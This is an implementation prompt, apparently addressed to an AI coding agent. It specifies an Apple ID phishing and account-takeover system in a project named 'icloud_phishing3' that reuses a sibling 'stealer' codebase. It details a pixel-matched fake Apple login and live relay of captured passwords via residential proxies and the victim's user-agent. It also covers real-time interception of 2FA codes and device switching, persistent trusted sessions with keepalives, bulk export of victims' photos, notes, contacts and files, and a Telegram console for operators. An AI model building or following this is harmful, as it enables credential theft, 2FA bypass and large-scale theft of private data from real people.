# Implementation prompt — real iCloud login, 2FA, session vault, export and Telegram console

You are implementing a production-grade integration inside
`/home/pc/Desktop/tools/ia_projects/pges/icloud_phishing3` (React + Tailwind
front end, Node/Express web process, Node Socket.IO process, grammY bot, Python
helper). Work on the real files; keep the existing visual design and tests
passing.

Before writing code, read:

- `.opencode/skills/pyicloud-api/SKILL.md` and its `references/` (auth/session,
  services, models, downloaders, unsupported features).
- `server/` (`config.js`, `store.js`, `socket/*`, `telegram/*`, `geo/*`).
- `src/` (`App.jsx`, `pages/*`, `lib/socket.js`, `admin/*`).
- `python/client.py` and `python/requirements.txt`.
- Sibling reference implementation for proven pyicloud/session/proxy/export
  patterns: `../icloud_phishing/stealer/` — especially `harvest_core.py`,
  `proxy_support.py`, `icloud_bot.py`, `stealer_api.py`, `manager.py`. Copy or
  adapt; do not add a runtime dependency on that folder if avoidable.

## 1. Mission

A visitor enters an Apple ID email + password on our page. The system must:

1. Reuse an existing trusted session when we already hold one; otherwise log in
   with `pyicloud` **from the victim's country and with the victim's browser
   user-agent**.
2. Keep the browser on an Apple-style loading state while the answer is unknown.
3. Show an error for wrong email/password; show 2FA immediately when Apple asks
   for it, including **choosing which trusted phone/device receives the code**.
4. Trust the session after a valid code, persist cookies, and never lose it.
5. On success redirect to the existing `/terms` page (then `/done`).
6. Log everything to Telegram: visitor IP/country, proxy country/exit, invalid
   vs valid, 2FA method, phone/device switches, code accepted, session captured.
7. Collect account profile/plan/storage and counts (photos, Hidden, Recently
   Deleted, notes, contacts with phone/email, drive files/bytes, reminders,
   calendars, family/devices).
8. Export all data to `./export/{email}/` with resumable, skip-existing
   downloads and live progress (`1/10000`, `2/10000`, …), not only photos.
9. Drive a Node Telegram console with `/menu`, inline buttons, 5 accounts per
   page, next/prev/refresh, per-account details, status lights, export progress,
   and “redownload missing”.
10. Run **many victims in parallel** (10+) without one blocking another.

## 2. Architecture (non-negotiable)

```
browser ──HTTP──▶ web :3000 (static/geo only)
   │
   └─Socket.IO──▶ socket :4001
                    ├─ /public   browser auth/2FA/export events
                    ├─ /admin    password-protected operator UI
                    ├─ /worker   Python workers (shared token)
                    ├─ Store      single writer/owner
                    └─ grammY     Telegram bot + outbox
                          ▲
                          │ Socket.IO (outbound)
                    Python worker pool : palette of threads
                    ├─ auth jobs (10 concurrent)
                    ├─ export jobs (per-account, bounded)
                    └─ export/{email}/… + sessions/{hash}/…
```

Rules:

- **One writer per store.** Only the Socket.IO process mutates accounts/jobs.
  The web process keeps serving static files/geo and never touches state.
- **Node never calls Python synchronously.** Dispatch jobs over Socket.IO with a
  job id; Python emits progress/results. Node event loop must never await a
  login or a download.
- **Python owns blocking work.** `pyicloud` is synchronous: run each job in a
  thread from the worker's pool, with one asyncio loop for Socket.IO. Enforce
  `MAX_AUTH_JOBS` (default 10) and `MAX_EXPORT_JOBS` (default 4); queue the
  rest. Advertise free slots with `worker:ready`.
- **One writer per account session directory.** A per-email async lock; a second
  submission for the same email attaches to the existing job instead of opening
  the same cookie directory twice.
- **Telegram is out of the hot path.** A per-chat outbox coalesces progress and
  edits in place. Never `await bot.api.*` inside a socket handler without a
  timeout; errors are logged, never thrown into the job path.
- **Throttle progress.** Python: at most 1 event/second/account. Node: update
  the Telegram message at most every 2–3 seconds; skip unchanged text; catch
  “message is not modified” and 429 `retry_after`.
- **Bounded queues.** Backpressure from worker slots; no unbounded arrays.
- Use rooms `job:<id>` and `account:<id>`; only the originating browser socket
  receives that job’s auth details.

## 3. Data model (extend `server/store.js`)

Keep the existing store class/events; add an `accounts` map (and a `jobs` map).
Persist to the existing JSON file with **atomic, debounced** writes (write temp
+ rename; coalesce bursts). Keep old `items` readable/migrate on load.

Account record (minimum):

```js
{
  id, email, password,                 // password server-side only
  status: "queued"|"auth"|"twofa"|"connected"|"invalid"|"error"|"exporting"|"done"|"dead",
  trusted: boolean,
  sessionDir,                           // sessions/<sha256(email)[:16]>
  fingerprint: { userAgent, language, timezone },
  geo: { ip, country, countryCode },    // victim
  proxy: { country, exitIp, urlMasked, ssid },  // login exit
  identity: { name, phone, plan, storage, family, devices },
  counts: { photos, hidden, deleted, notes, contacts, contactsPhone, contactsEmail,
            driveFiles, driveBytes, reminders, calendars, albums },
  export: { phase, startedAt, finishedAt, done, total, bytes, areas, manifestPath },
  lastPingAt, lastError, createdAt, updatedAt,
  telegramMessageId, shortId           // shortId for callback data
}
```

`shortId` = first 8 chars of a UUID (unique check); Telegram callback data must
stay under 64 bytes.

## 4. Socket contracts

Use Zod validation, per-socket rate limits and acks exactly like
`server/socket/public.js` / `admin.js`.

### Public (`/public`)

- `auth:start { email, password, userAgent, language, timezone }`
  → ack `{ ok, jobId, accountId }`; status becomes `queued`; browser goes to
  `/loading`.
- `auth:submit_2fa { jobId, choiceId, code }` → ack `{ ok }`.
- `auth:resend_2fa { jobId, choiceId }` → ack `{ ok }`.
- `auth:switch_2fa { jobId, fromChoiceId, toChoiceId }` → ack `{ ok }`
  (server switches delivery in Apple and logs `from → to`).
- `export:start { jobId }` → ack `{ ok }`; only after auth success/terms.
- Server emits to `job:<id>`:
  `auth:state { state, message?, reused? }`,
  `auth:2fa { method, options[], notice? }`,
  `auth:result { status: "ok"|"invalid"|"error", message?, account? }`,
  `account:info { identity, counts }`,
  `export:progress { area, done, total, bytes, overallDone, overallTotal }`,
  `export:done { manifest, totals }`.

Never emit password or session file contents to the browser.

### Worker (`/worker`, token auth)

- Handshake `auth: { token: WORKER_TOKEN }`; reject otherwise.
- `worker:ready { slots }` after connect and after each job.
- Node → worker: `job:start { job, account, proxy, fingerprint }`,
  `job:2fa { jobId, choiceId, code, action: "submit"|"resend"|"switch" }`,
  `job:ping { jobId, account }`, `job:export { jobId, account, mode }`,
  `job:cancel { jobId }`.
- Worker → Node: `job:state`, `job:2fa`, `job:result`, `job:account_info`,
  `job:export_progress`, `job:export_done`, `job:error`, `job:ping_result`.

Every command carries a `commandId`; worker acks it. Jobs are idempotent on
`jobId` (ignore duplicate start if already running).

### Admin (`/admin`)

Keep existing events. Add `admin:accounts {page,pageSize,query}`,
`admin:account {id}`, `admin:ping {id}`, `admin:refresh`,
`admin:export {id, mode: "missing"|"force"}`, `admin:stats`.

## 5. Security types you must handle

Apple can present any of these; the UI and logs must name the exact one:

| Type | pyicloud surface | UI |
|---|---|---|
| Password (SRP) | constructor / `authenticate()` | login form |
| HSA2 trusted-device push | `two_factor_delivery_method="trusted_device"`; `use_existing_trusted_device_code()` | “Enter the code shown on your devices” |
| HSA2 SMS to a trusted phone | `_phone_number_verification()` phone list; `PUT .../verify/phone` with `mode=sms` | picker, masked last 4 |
| HSA2 security key / FIDO2 | `security_key_names`, `fido2_devices`, `confirm_security_key()` | “security key required” |
| Legacy 2SA device | `trusted_devices`, `send_verification_code`, `validate_verification_code` | device picker |
| Trust token | `trust_session()` | no UI; log only |

Passkeys/“Sign in with iPhone” QR are **not** implemented by pyicloud — show a
clear fallback if Apple demands one. “Memos” in this project means Notes;
Voice Memos is not exposed by pyicloud (optional probe only).

## 6. Auth state machine (Python worker)

Create `python/worker/` (package) with `__main__.py`, `auth.py`, `twofa.py`,
`inventory.py`, `exporter.py`, `proxy.py`, `events.py`, `config.py`.

For each job:

1. **Path + proxy setup.** `sessionDir = sessions/<sha256(email)[:16]>`; make
   it `0700`. Attach the per-country proxy to the session **before any
   request**. Reuse `../icloud_phishing/stealer/proxy_support.py` (copy it):
   anyip username = `base,country_<CC>,session_<stable-account-ssid>`.
   Use a **stable ssid per account** (not per job) so the exit IP stays
   consistent with the trust token; on failure rotate only the trailing
   attempt digit inside `proxy_support`. Record the observed exit IP with one
   echo request through the same proxy.
2. **Preflight.** `PyiCloudService(email, password, cookie_directory=...,
   authenticate=False, accept_terms=True)`. Set the stored session/`UA` first:
   `api.session.headers["User-Agent"] = userAgent`,
   `Accept-Language = language`. Then `api.get_auth_status()`.
   If `authenticated && trusted_session` → emit `reused` and go to success
   (skip password login). This is the “already connected → terms” path.
3. **Full login.** Same service object: `api.authenticate()` (or construct a
   new one with `authenticate=True` after setting the UA on a temporary
   session). Distinguish:
   - `PyiCloudFailedLoginException` → `invalid` (Apple ID/password).
   - `PyiCloudConnectionException`/5xx → retry once, then `error`.
   - `PyiCloudAcceptTermsException` → should not happen with `accept_terms=True`.
4. **2FA / 2SA.** If `api.requires_2fa`:
   - Determine options. Public API: `two_factor_delivery_method`,
     `two_factor_delivery_notice`, `security_key_names`, `fido2_devices`.
     For HSA2 phone choices use `api._phone_number_verification()` (private but
     stable in 2026.10.1) and mask each number as
     `+CC ••• ••• 1234` — **show last 4 only**.
   - Build options: `trusted_device` (push / existing code), one entry per
     trusted phone (`sms:<id>`), and `security_key` when names exist.
   - Default to the method Apple already requested; emit `auth:2fa` at once.
   - “Resend/switch”: for SMS call the private `PUT {auth}/verify/phone` with
     the chosen phone payload and `mode=sms` (or temporarily bind
     `api._trusted_phone_number` to the choice), then update
     `two_factor_delivery_method`. For trusted-device use
     `api.use_existing_trusted_device_code()`.
   - On code: `api.validate_2fa_code(code)` (accept 409/412 repair semantics;
     allow 3 attempts). Then if `not api.is_trusted_session`:
     `api.trust_session()`; if it returns false, keep session but mark
     `trusted=false` and log warning.
   - If `api.requires_2sa`: list `api.trusted_devices`, expose each
     `deviceName`/`phoneNumber` (mask), `send_verification_code(device)`, then
     `validate_verification_code(device, code)` (this trusts internally).
   - Security key: `api.confirm_security_key(device, event=...)` only when a
     physical key is available; otherwise show “security key required”.
   - Log every state and every method switch (`from`, `to`, masked label).
5. **Success.** Verify `api.is_trusted_session`; persist `.session` +
   `.cookiejar` (back up both before any re-auth attempt; never call
   `logout()`). Emit `auth:ok`.
6. **Profile + counts.** Run `inventory.py` (read-only):
   - `api.account.storage`, `summary_plan`, `devices`, `family`;
   - `api.contacts.me` + `all` (count contacts with phone/email);
   - `len(api.photos.all)`, `len(api.photos.albums["Hidden"])`,
     `len(api.photos.albums["Recently Deleted"])`, album count;
   - notes: `iter_all()` filtered `not is_deleted`; count, and folders;
   - drive: iterative `get_children()` count files/bytes;
   - reminders/calendar: lists/calendars/current-month events;
   - emit `account:info` and persist.
7. **Export** (after `/terms` agrees, or admin command): `exporter.py` writes
   `export/{email}/`:
   `Photos/{Hidden,Recently Deleted,Library,<albums>}`, `Notes/{txt,html,assets}`,
   `Drive/…`, `Contacts/contacts.json`, `Calendar/calendars.json`,
   `Reminders/reminders.json`, `Account/account.json`, plus
   `manifest.sqlite3`.
   - Enumerate first, compute totals, then download with skip-existing by
     size + SHA-256. Never overwrite a good file; temp file + rename.
   - Dedupe photos by `asset.id`; Hidden first, then Recently Deleted, then
     Library/albums. Stream `versions["original"]["url"]` (do not use
     `asset.download()` for videos).
   - Notes: `ck_subscribe` workaround (see skill/media reference) before zone
     reads; `export_note(..., export_mode="archival")`.
   - Counts/progress per area (`photos`, `hidden`, `deleted`, `notes`,
     `drive`, `contacts`, `calendar`, `reminders`); emit at most 1/s with
     `{area, done, total, bytes, overallDone, overallTotal}`.
   - A failed item is logged and skipped; export continues. Resume from the
     manifest on restart.
8. **Ping/keepalive job.** `get_auth_status()`; if invalid/421/450/2FA, mark
   `dead`; else `connected` with `lastPingAt`. Never logout; never delete
   cookies. Schedule a Python keepalive loop (default 6 h/account) and record
   results. Trust realistically lasts ~30 days and is IP-bound — keep the proxy
   session stable.

## 7. Proxy, country and user-agent

- Victim country comes from Node (`geo.lookup(ip, {headerCountry})`), never
  from a client-supplied string. Validate ISO-2.
- Login proxy is **residential sticky anyip**, separate from `GEO_PROXIES`
  (which resolves visitor IPs). Add `ANYIP_PROXY_URL` /
  `ICLOUD_PROXY_URL` to `.env.example`.
- Build `user,country_<CC>,session_<accountStableId>`; keep it stable for the
  account. If the country has no peer, fall back to the victim country’s
  nearest supported country and log the fallback. Never silently use a random
  country.
- Set the victim’s `userAgent` and `Accept-Language` on `api.session` **before**
  `authenticate()`; capture them from the browser (`navigator.userAgent`,
  `navigator.language`, `Intl...timeZone`), with the socket handshake header as
  fallback. Do not fake a UA that contradicts the proxy/TLS; matching the
  victim is the goal.
- Store `proxy.exitIp` (observed) and `proxy.urlMasked`; never log credentials.

## 8. Front-end

- Login submit → `auth:start` → `/loading` (keep the Apple veil). Do not use the
  current 3.5 s timer; wait for the socket result (show “taking longer” after
  15 s, never auto-error).
- Result routing:
  - `ok` → `/terms`;
  - `invalid` → `/sign-in` with an Apple-style inline error (“Incorrect Apple
    Account or password.”) and the email preserved;
  - `error` → a retryable error state;
  - `2fa` → `/verify` with the device/phone picker and code inputs.
- `/verify` must show the masked options, “Send code”, “Resend”, “Use another
  phone/device”, a countdown/rate-limit message, and call
  `auth:submit_2fa` / `auth:switch_2fa`. Show the code field only after the
  chosen delivery is confirmed.
- After a valid code, show success and navigate `/terms`. On `/terms` agree,
  emit `export:start`, navigate `/done`.
- Keep the existing pixel-matched Apple styling; add states without changing
  the reference pages’ look.
- Never render the password back; never put session data in `localStorage`.
- Use a `jobId` in `sessionStorage` so a refresh on `/loading`/`/verify`
  re-attaches to the job.

## 9. Telegram

Use the existing bot in `server/telegram/bot.js`; move text/keyboards to
`views.js`.

- **New visitor** (on `auth:start`): one message: email, IP, country, proxy
  country/exit, UA (short), status “authenticating”.
- **Result edits** the same message: invalid / valid+2FA (method) / code
  accepted / trusted / session captured / error.
- **2FA switch**: add a line `2FA switched: trusted_device → sms ••••1234`.
- **Account card** after info: name, email, phone, plan, storage, counts; then
  export percentage.
- **Export**: “Export started”; edit same message with
  `Photos 2310/10000 · Notes 41/312 · Drive 88/1200 · 37%` plus bytes; edit at
  most every 2–3 s, coalesce.
- Never block; fire-and-forget with retry. Keep `telegramMessageId` per account.

### `/menu` console

`/menu` (and inline “Menu” buttons) shows accounts 5 per page:

- Status light: 🟢 = last ping succeeded and session trusted;
  🟡 = never pinged / stale / unknown; 🔴 = session dead / 2FA required.
- Buttons per account (`A:<shortId>`), `‹ Prev`, `page x/y`, `Next ›`,
  `🔄 Refresh`, `📊 Stats`.
- Account view: status, email, name, phone, plan, created, last ping, proxy
  country/exit, session trusted, counts, export progress; buttons:
  `🔄 Ping`, `📥 Export missing`, `♻️ Redownload missing`, `📊 Counts`,
  `‹ Back`, `🏠 Menu`.
- Refresh re-queries the store and reports new accounts; new accounts also
  push a notification message.
- Callback data under 64 bytes; `answerCbQuery` immediately; edit in place.
- “Redownload” must skip existing files (verify size/hash) unless the operator
  explicitly requests `mode:"force"`.

## 10. Concurrency, failure and safety

- Per-account lock; same-email duplicate joins the running job.
- Auth retries: invalid password = no retry; network/5xx = 1 retry; never
  retry a submitted 2FA code blindly.
- Export reads retry 3× with exponential backoff; honour 429 `retry_after`;
  never retry writes blindly (there are no iCloud writes here except
  Photos metadata for upload; export is read-only).
- If a session dies mid-export: stop that account, mark red, keep files, do not
  delete cookies.
- Back up `.session` and `.cookiejar` before re-auth; restore if the attempt
  fails and the old session was valid.
- Sanitize every remote name/path; keep downloads inside `export/{email}`.
- Disable pyicloud INFO/DEBUG logging in production (signed URLs leak); log
  exception class + status only.
- Node store writes atomic + debounced; no partial JSON.
- Graceful shutdown: stop accepting jobs, let in-flight jobs finish or emit
  `interrupted`, close worker socket.

## 11. Config / deps / scripts

Add to `.env.example`:

```
WORKER_TOKEN=change-me
WORKER_URL=http://127.0.0.1:4001
ANYIP_PROXY_URL=http://user:pass@portal.anyip.io:1080
MAX_AUTH_JOBS=10
MAX_EXPORT_JOBS=4
EXPORT_DIR=./export
KEEPALIVE_HOURS=6
```

Python: add `pyicloud>=2026.10.1`, `python-socketio[asyncio_client]`,
`requests`, `pillow-heif`/OCR optional only if reusing seed scan. Add
`python/worker/requirements.txt` or extend `python/requirements.txt`.

npm scripts: `worker`, `all` (concurrently web+socket+worker); keep `backend`.

## 12. Acceptance tests (must pass)

1. Mock/fake worker: valid no-2FA → loading → terms; invalid → inline error;
   existing session → terms without password login.
2. 2FA: SMS option list shows masked last-4 only; choosing one sends via
   iCloud; code accepted; `trust_session` called; cookies persisted.
3. 2FA switch logs `from → to` in Telegram and sends the code to the selected
   destination.
4. Ten simulated accounts run simultaneously; each has independent progress and
   Telegram message; no event loop stall.
5. Export: 10k simulated assets produce monotonic `1/10000 …`; existing files
   are skipped; restart resumes; failure of one asset does not stop the rest.
6. `/menu`: 5 per page, prev/next, refresh, green/yellow/red correctness,
   account detail, ping, export, redownload.
7. Restart Node: accounts persist; worker reconnects; stale jobs marked
   `unknown`; no lost session files.
8. `npm run build`, `npm run test:socket`, and a new Python test suite pass.

## 13. Suggested implementation order

1. Extend store + events + worker namespace + token auth.
2. Python worker skeleton (socket client, job manager, thread pool, per-account
   lock, proxy copy, UA).
3. Auth + preflight + 2FA/2SA + trust + session persistence.
4. Front-end routing/loading/error/2FA picker.
5. Inventory + counts + account card.
6. Exporter + manifest + progress + Telegram edits.
7. `/menu` console + pagination + actions.
8. Concurrency, backpressure, keepalive, restart recovery.
9. Tests and docs; update `.env.example` and README.

## 14. Definition of done

- One code path handles: already-connected, invalid, 2FA (device + every
  phone), 2SA, security key, trust, persistence.
- The victim never sees a raw pyicloud error; every state has an Apple-style
  page.
- 10 parallel accounts work; Node stays responsive; Telegram edits do not
  block.
- Session files survive restarts and failed logins; cookies are never deleted.
- Export is resumable, skip-existing, and reports per-area + overall progress.
- `/menu` is fully button-driven, 5 per page, with status lights and
  redownload.
- All sensitive values (password, cookies, signed URLs) stay server-side.
